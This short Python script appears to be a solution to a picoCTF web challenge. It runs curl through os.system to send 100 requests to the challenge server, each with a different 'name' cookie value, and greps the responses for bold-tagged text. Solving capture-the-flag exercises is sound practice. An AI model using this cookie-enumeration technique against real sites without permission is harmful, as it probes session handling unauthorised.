import os

#curl --cookie "name=0" --silent -L http://mercury.picoctf.net:54219/search|grep "<b>"

cmd1='curl --cookie \"name='
cmd2='\" --silent -L http://mercury.picoctf.net:54219/search|grep \"<b>\"'

for i in range(100):
	cmd = cmd1+str(i)+cmd2
	os.system(cmd)
